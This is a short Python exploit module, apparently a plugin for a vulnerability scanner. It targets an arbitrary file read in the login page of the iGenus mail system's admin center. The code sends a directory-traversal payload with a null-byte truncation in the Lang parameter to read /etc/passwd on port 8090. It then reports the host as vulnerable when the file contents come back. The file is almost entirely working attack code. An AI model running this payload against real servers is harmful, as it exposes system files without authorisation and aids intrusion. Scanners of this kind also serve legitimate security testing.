#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: iGenus邮箱系统管理中心sys/login.php 参数Lang任意文件读取
referer: http://www.wooyun.org/bugs/WooYun-2015-146923
author: Ascotbe
reference: Lucifer
description: Lang存在遍历，%00截断 8090端口。
'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payload = "/sys/login.php?Lang=../../../../../../../../../../etc/passwd%00.jpeg&cmd=form"
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global   resp
    port = 8090
    payload_url = scheme+"://"+url+":"+str(port)+payload
    headers = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'User-Agent': RandomAgent,
    }
    try:
        #s = requests.session()
        if ProxyIp!=None:
            proxies = {
                # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                "http": "http://" + str(ProxyIp)
            }
            resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
        elif ProxyIp==None:
            resp = requests.get(payload_url,headers=headers, timeout=5, verify=False)
        con = resp.text
        code = resp.status_code
        if con.lower().find('/bin/bash')!=-1 and con.lower().find('root:')!=-1:
            Medusa = "{} 存在iGenus邮箱系统管理中心sys/login.php 参数Lang任意文件读取漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
            return (Medusa)
    except Exception as e:
        pass